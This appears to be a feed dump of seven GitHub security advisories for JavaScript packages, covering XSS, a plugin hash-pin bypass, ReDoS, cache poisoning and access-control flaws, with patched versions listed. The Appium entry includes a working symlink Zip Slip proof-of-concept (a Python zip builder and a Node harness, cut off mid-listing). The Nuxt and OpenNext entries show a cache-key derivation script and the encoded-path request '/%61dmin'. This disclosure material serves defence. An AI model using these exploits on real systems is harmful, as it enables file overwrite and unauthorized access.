items.title: [@tanstack/start-server-core] TanStack Router: Unauthenticated reflected XSS in TanStack Start server-function responses
items.summary: ImpactAn unauthenticated attacker can craft a URL to a server function in an affected TanStack Start app. If someone opens the link, the app can return attacker-controlled HTML from its own origin and run the attacker's JavaScript there. The script can access same-origin data available to that visitor and make requests with their authority.CauseThe server-function transport can pass request payload fields into internal middleware state instead of limiting them to public input fields. A malformed payload can leave an attacker-controlled result in the error path. Response handling can then treat a response-shaped object as an HTTP response.Affected versionsPublished versions of @tanstack/start-server-core, @tanstack/react-start, @tanstack/solid-start, and @tanstack/vue-start from 1.143.12 up to, but not including, their respective patched versions are affected. The patched versions are @tanstack/start-server-core@1.169.39, @tanstack/react-start@1.168.60, @tanstack/solid-start@1.168.57, and @tanstack/vue-start@1.168.56.FixThe fix limits client-supplied server-function input to public fields and validates responses at the server boundary. Upgrade to the corresponding patched package version.Temporary mitigationsFor the configured server-function path, usually /_serverFn/*, an edge or WAF rule can consider blocking requests without the literal x-tsr-serverFn: true header and browser document navigations such as Sec-Fetch-Mode: navigate or Accept: text/html. A restrictive Content Security Policy on server-function responses can provide another browser-side restriction. These are mitigation suggestions, not a complete fix. The header is client-controlled and is not authentication. Test rules against legitimate GET and POST server functions and use a matching version-specific backport where possible.CreditsLovable helped us discover and report this issue. We thank them for their help.Referenceshttps://github.com/TanStack/router/security/advisories/GHSA-qx66-fv34-fjm8https://nvd.nist.gov/vuln/detail/CVE-2026-102989https://github.com/TanStack/router/pull/8573https://github.com/TanStack/router/commit/d521abd71c69f1ff010bb3def4d417cb5fa058cbhttps://github.com/TanStack/router/releases/tag/release-2026-09-30-1747https://github.com/advisories/GHSA-qx66-fv34-fjm8

items.title: [@anthropic-ai/claude-code] Claude Code: Plugin Hash Pin Bypass Allows Bypass of Hash Pinning
items.summary: The plugin install flow in Claude Code and Claude Desktop checked out a marketplace's pinned commit SHA using git checkout without verifying that the resulting HEAD matched the pinned SHA. An attacker controlling a plugin's upstream repository could create a branch named identically to the pinned 40-character SHA, causing the checkout to silently resolve to the attacker's branch tip instead of the reviewed commit, resulting in attacker-controlled code being installed bypassing the pinned hash. Exploitation required a user to install a malicious plugin, pin to a safe hash, and for the plugin source to be hosted on a git host that permitted SHA-shaped branch names.Users on standard Claude Code auto-update have received this fix already. Users performing manual updates are advised to update to the latest version.Thank you to Or Nevo Michrowski of Air Security for reporting this issue.Referenceshttps://github.com/anthropics/claude-code/security/advisories/GHSA-pq7j-f95f-qfcvhttps://nvd.nist.gov/vuln/detail/CVE-2026-86063https://github.com/anthropics/claude-code/releases/tag/v2.1.179https://github.com/advisories/GHSA-pq7j-f95f-qfcv

items.title: [@builder.io/qwik] Qwik: Crashing any Qwik Server via Resource thenable
items.summary: SummaryA Qwik server in the default configuration can be crashed with one unauthenticated HTTP request. During qwik-json body parsing, ResourceSerializer.$fill$ does Promise.resolve(resource._resolved). If _resolved is a plain object whose .then is a QRL for an unregistered symbol, the async QRL rejects, the rejection is orphaned, and Node terminates the process via its default unhandled-rejection policy.ImpactOne unauthenticated request crashes the server. Looping keeps every replica dead as long as the attacker sends requests.Referenceshttps://github.com/QwikDev/qwik/security/advisories/GHSA-x586-xvc8-g7q6https://nvd.nist.gov/vuln/detail/CVE-2026-84994https://github.com/QwikDev/qwik/pull/8655https://github.com/QwikDev/qwik/commit/c1e7444402f9592b5cf9096e10bf303ab4640511https://github.com/QwikDev/qwik/releases/tag/@builder.io/qwik@1.20.0https://github.com/advisories/GHSA-x586-xvc8-g7q6

items.title: [@backstage/backend-defaults] Backstage: Improper access control in backend action invocation
items.summary: ImpactAn authenticated user could invoke actions that an operator had excluded through action configuration. Existing action permissions and downstream authorization remain enforced.PatchesPatched in @backstage/backend-defaults version 0.17.8WorkaroundsLimit access to action invocation endpoints to trusted service callers until upgrading.Referenceshttps://github.com/backstage/backstage/security/advisories/GHSA-3xr5-8w6c-p5gwhttps://nvd.nist.gov/vuln/detail/CVE-2026-106495https://github.com/backstage/backstage/commit/a8fb34a990a69bcb745e85a3213cf9e5ba2d31a3https://github.com/backstage/backstage/releases/tag/v1.54.6https://github.com/advisories/GHSA-3xr5-8w6c-p5gw

items.title: [@appium/support] Appium: Symlink based Zip Slip in @appium/support ZIP extraction
items.summary:
SummaryCVE-2026-30973 (GHSA-rfx7-4xw3-gh4m) was a plain path traversal in the entry name. The containment check built an Error object without throwing it, so an entry literally named something like ../evil.txt was written outside the destination. That issue was fixed in @appium/support 7.0.6 by actually rejecting out of bound entry names.This finding is a different vector that the 7.0.6 fix does not cover. The archive entry names here are completely legitimate (for example pwn and pwn/owned.txt, no .. anywhere), so every name based defense accepts them. The escape happens through a symbolic link. One entry is a symlink whose target points outside the extraction directory, and a later entry is a regular file whose name resolves through that symlink. The name based containment check never inspects the symlink target, and the extractor writes the symlink target verbatim, so the file lands outside the extraction root.The two issues compared on the same patched version 7.2.5:CVE-2026-30973This findingVectorone entry whose name contains ..a symlink entry plus a file written through itEntry namescontain .. (illegal)legitimate, no .. and not absoluteWhat is missingthe .. name chec\k did not throwname checks never resolve symlinks, and the symlink target is uncheckedEntries neededonetwoFixed in 7.0.6yesnoStatus on 7.2.5blockedstill exploitable (proven below)DetailsRoot causeThe extractor applies only a lexical containment check on each entry's own name, then for a symlink entry it creates the link with the target taken straight from the archive:// @appium/support build/lib/zip.js (extractAllTo path), version 7.2.597   if (!isSubPath(dest, dir)) {                 // lexical only, never resolves symlinks98       throw new Error(`Out of bound path "${dest}" found while processing file ${fileName}`);99   }...142  await fs.symlink(link, dest);                // link target comes verbatim from the archiveisSubPath compares normalized strings and does not call realpath, so for the file entry pwn/owned.txt the destination dir/pwn/owned.txt is lexically inside dir and the check passes, even though dir/pwn is a symlink created by the previous entry that points outside dir. The write then follows that symlink and escapes. The symlink target itself is never validated against the extraction root.PoCbuild_zips.py#!/usr/bin/env python3import os, sys, zipfile, shutilwork = sys.argv[1] if len(sys.argv) > 1 else "/tmp/zswork"pid = os.getpid()shutil.rmtree(work, ignore_errors=True)os.makedirs(work)# Test A: CVE-2026-30973 plain "../" path traversal in the entry nameextractA = os.path.join(work, "extractA"); os.makedirs(extractA)escapeA_name = f"escapeA_{pid}.txt"            # would land in work/ (outside extractA)escapeA = os.path.join(work, escapeA_name)zipA = os.path.join(work, "cve_vector.zip")with zipfile.ZipFile(zipA, "w") as z:    z.writestr("../" + escapeA_name, "CVE-2026-30973 plain traversal
")# Test B: symlink entry whose target escapes, then a file through it extractB = os.path.join(work, "extractB"); os.makedirs(extractB)escapeB = os.path.join(work, f"escapeB_{pid}"); os.makedirs(escapeB)zipB = os.path.join(work, "symlink_bypass.zip")with zipfile.ZipFile(zipB, "w") as z:    sl = zipfile.ZipInfo("pwn")    sl.create_system = 3                       # unix, so external_attr carries the mode    sl.external_attr = (0o120777 & 0xFFFF) << 16   # S_IFLNK | 0777    z.writestr(sl, escapeB)                     # symlink target is the file body    fi = zipfile.ZipInfo("pwn/owned.txt")    fi.create_system = 3    fi.external_attr = (0o100644 & 0xFFFF) << 16    z.writestr(fi, "PWNED via symlink Zip Slip
")print("	".join([work, extractA, escapeA, zipA, extractB, escapeB, zipB]))zipslip_poc.js'use strict';const fs = require('fs');const path = require('path');const support = require('@appium/support');const [, , work, extractA, escapeA, zipA, extractB, escapeB, zipB] = process.argv;(async () => {  const ver = require('@appium/support/package.json').version;  console.log(`[*] @appium/support version: ${ver}`);  console.log(`[*] CVE-2026-30973 was fixed in 7.0.6, so on this newer version the plain ../ vector should be blocked.`);  // Test A: the CVE-2026-30973 vector  console.log('
=== Test A: CVE-2026-30973 plain "../" entry name ===');  let aBlocked = false;  try {    await support.zip.extractAllTo(zipA, extractA);  } catch (e) {    aBlocked = true;    console.log(`[+] REJECTED by extractor: ${String(e.message).split('
')[0]}`);  }  const aEscaped = fs.existsSync(escapeA);  console.log(`[=] ${aBlocked && !aEscaped ? 'BLOCKED, so CVE-2026-30973 is PATCHED in this version' : 'ESCAPED (not patched)'}`);  // Test B: this finding, the symlink bypass   console.log('
=== Test B: symlink entry + file written through it (this finding) ===');  try {    await support.zip.extractAllTo(zipB, extractB);  } catch (e) {    console.log(`[i] extractor message: ${String(e.message).split('
')[0]}`);  }  const planted = path.join(escapeB, 'owned.txt');

items.title: [nuxt-og-image] Nuxt OG Image cache poisoning through derivable cache keys on unsigned dynamic image routes
items.summary: Vendor: NuxtProduct: Nuxt OG ImageVersion: 6.2.5Description: Due to the specifics of caching and key generation in the Open Graph image cache created by the module, an unauthenticated attacker can modify the content of the image (for example, the title parameter) that is delivered to the user. Impact: Content SpoofingVulnerable component: route /_og/d/*.pngExploitation conditions: Access to the applicationMitigation: Upgrade to 6.7.2 and set a sufficiently secure secret in config ogImageResearcher: Dmitry Vanin (Positive Technologies)ResearchDuring the previous vulnerability research, it was discovered that version 6.2.5 changed the mechanism for generating cache indexes; it now takes into account the parameters passed during image generation.However, the image is still generated from data transmitted to the attacker.Listing 1. New code for generating indexes in cacheexport function resolvePathCacheKey(e: H3Event, path: string, resolvedOptions?: Record<string, any>) {  const siteConfig = getSiteConfig(e, {    resolveRefs: true,  })  const basePath = withoutTrailingSlash(withoutLeadingSlash(normalizeKey(path)))  const hashParts: any[] = [    basePath,    import.meta.prerender ? '' : siteConfig.url,  ]  // Hash resolved options (not raw query string) so unknown/extra query params  // cannot produce unique cache keys and bypass the cache.  if (resolvedOptions)    hashParts.push(hash(resolvedOptions))  return [    (!basePath || basePath === '/') ? 'index' : basePath,    hash(hashParts),  ].join(':')}In this case, basePath is obtained from the _path parameter, resolvedOptions are the normalized settings of the component, for example:Listing 2. An example of resolvedOptions{"emojis":"noto","extension":"png","width":1200,"height":600,"cacheMaxAgeSeconds":259200,"component":"OgImageDefaultImageTakumi"}From the analysis of resolvedOptions, it was concluded that, in general, all parameters are known either from the direct link to the OG Image or from the server response.Vulnerability reproductionFind the route to OG Image.Figure 1. Demonstration of finding the route to OG ImageRetrieve parameters from the server’s response, especially cacheMaxAgeSeconds (cache-control header, s-maxage key), the other parameters are known from the meta tags as well as from the c_<component name> parameter.Figure 2. Obtaining parametersGenerate a cache key using a script.Listing 3. Srciptimport {hash} from "ohash";var url = "https://contoso.com"var obj = JSON.parse(`{"emojis":"noto","extension":"png","width":1200,"height":600,"cacheMaxAgeSeconds":259200,"component":"OgImageBlogPostTakumi"}`)var basePath = '/'var hashParts = [    basePath,    url  ]  if (obj)    hashParts.push(hash(obj))console.log([    (!basePath || basePath === '/') ? 'index' : basePath,    hash(hashParts),  ].join(':'))Repeat the steps as in the vulnerability 1, but transmit the obtained cacheKey in addition.  Thus, the same result as in the vulnerability 1 was obtained.Figure 4. Server responseCreditsResearcher: Dmitry Vanin (Positive Technologies)Referenceshttps://github.com/nuxt-modules/og-image/security/advisories/GHSA-2x6f-rp82-ppmjhttps://nvd.nist.gov/vuln/detail/CVE-2026-102527https://github.com/nuxt-modules/og-image/pull/638https://github.com/nuxt-modules/og-image/commit/e6c5b53ce7f434ab8cbc91298dccfb2b515c56a5https://github.com/nuxt-modules/og-image/releases/tag/v6.7.0https://github.com/advisories/GHSA-2x6f-rp82-ppmj

items.title: [@opennextjs/cloudflare] OpenNext Cloudflare: Cache interception can bypass middleware protection for encoded paths
items.summary: SummaryWhen cache interception is enabled, @opennextjs/cloudflare can interpret percent-encoded paths differently during middleware matching and cache lookup.An encoded request may fail to match authorization middleware, then be decoded into the cache key of a protected route. The cached response may consequently be returned without invoking the middleware.enableCacheInterception is disabled by default.ImpactA remote unauthenticated attacker may retrieve cached content from routes intended to be protected by middleware.An application is affected when it:explicitly enables enableCacheInterception;relies on middleware for access control; andhas a matching cached route.DetailsMiddleware matching previously used the encoded request pathname, while cache interception decoded the pathname before selecting a cache entry.For example, consider an application with:middleware matcher /admin/:path*;middleware returning 401 Authentication required for /admin;a statically generated, cached /admin route; andcache interception enabled:export default defineCloudflareConfig({  incrementalCache: staticAssetsIncrementalCache,  enableCacheInterception: true,});An attacker can request:GET /%61dminThe encoded pathname does not match /admin/:path*, so the authorization middleware is not invoked. Cache interception then decodes %61dmin to admin and may return the cached /admin response:HTTP/1.1 200 OKx-opennext-cache: HITProtected contentMalformed paths exposed an additional inconsistency. For example:GET /%61dmin/%ZZThe previous implementation decoded each segment independently. It decoded %61dmin to admin but retained the malformed %ZZ segment, allowing cache lookup to continue using a partially decoded pathname.PatchesThe fix aligns encoded-path handling across middleware matching and cache lookup, and rejects malformed paths instead of partially decoding them. See the upstream fixes in opennextjs-aws#1199 and opennextjs-aws#1200.Users should upgrade to @opennextjs/cloudflare@1.20.2 or later.WorkaroundsIf upgrading is not immediately possible for an application:Disable cache interception by removing enableCacheInterception: true.Enforce authorization inside protected route handlers rather than relying exclusively on middleware.Reject encoded paths for protected routes at a trusted proxy before they reach the Worker.Adding individual encoded matcher variants is not a complete workaround because pathnames can have multiple equivalent encodings.Referenceshttps://github.com/opennextjs/opennextjs-cloudflare/security/advisories/GHSA-2vc4-c4r6-p6v6https://nvd.nist.gov/vuln/detail/CVE-2026-100409https://github.com/opennextjs/opennextjs-aws/pull/1199https://github.com/opennextjs/opennextjs-aws/pull/1200https://github.com/opennextjs/opennextjs-cloudflare/commit/38ea40b669be272ddf09a7df7e70c69d0b57404bhttps://github.com/opennextjs/opennextjs-cloudflare/releases/tag/@opennextjs/cloudflare@1.20.2https://github.com/advisories/GHSA-2vc4-c4r6-p6v6

items.title: [@adonisjs/http-server] AdonisJS HTTP Server: Uncontrolled Resource Consumption and Inefficient Regular Expression Complexity
items.summary: DescriptionA Regular Expression Denial of Service vulnerability in the built-in AdonisJS slug route matcher may allow a remote attacker to block the Node.js event loop using a specially crafted URL.This affects applications using router.matchers.slug() on a route parameter reachable by an attacker.DetailsThe regular expression used by router.matchers.slug() contains adjacent greedy quantifiers with overlapping character classes:/^[^\s-_](?!.*?[-_]{2,})([a-z0-9-\\]{1,})[^\s]*[^-_\s]$/When the matcher receives a long string ending with a character rejected by the final assertion, the regular expression engine must evaluate many possible ways of dividing the input between the overlapping quantifiers before determining that it does not match.This results in quadratic execution time. Testing measured an approximate complexity of O(n^1.98).Route matchers are evaluated against attacker-controlled URL segments during routing. Therefore, an unauthenticated attacker can trigger the vulnerable expression by sending a request to a route configured as follows:router  .get('/posts/:slug', handler)  .where('slug', router.matchers.slug())Routing occurs before route and group middleware. As a result, authentication or rate-limiting middleware attached to the affected route may not prevent exploitation.The vulnerability is limited to routes that explicitly use the built-in slug matcher.ImpactExploitation requires an application to expose a route using router.matchers.slug() with an attacker-controlled parameter.A specially crafted request can cause excessive CPU consumption and block the Node.js event loop. While the expression is being evaluated, the process cannot serve other requests, including requests to unrelated routes or health-check endpoints.Only a small number of requests may be required to consume the capacity of a worker. Reverse-proxy request-line limits reduce the maximum processing time of an individual request but do not fully mitigate the vulnerability.PatchesFixes targeting v6 and v7 have been published below.Users should upgrade to a version that includes the following fix:https://github.com/adonisjs/http-server/releases/tag/v9.1.1https://github.com/adonisjs/http-server/releases/tag/v8.2.2Referenceshttps://github.com/adonisjs/http-server/security/advisories/GHSA-524c-h47v-m3h8https://github.com/adonisjs/http-server/commit/86af38ca861528f673dcac6a4806197de038d1f7https://github.com/adonisjs/http-server/commit/d8c749aa9f66d5d214bad1cad727264aef4be727https://github.com/adonisjs/http-server/releases/tag/v8.2.2https://github.com/adonisjs/http-server/releases/tag/v9.1.1https://github.com/advisories/GHSA-524c-h47v-m3h8
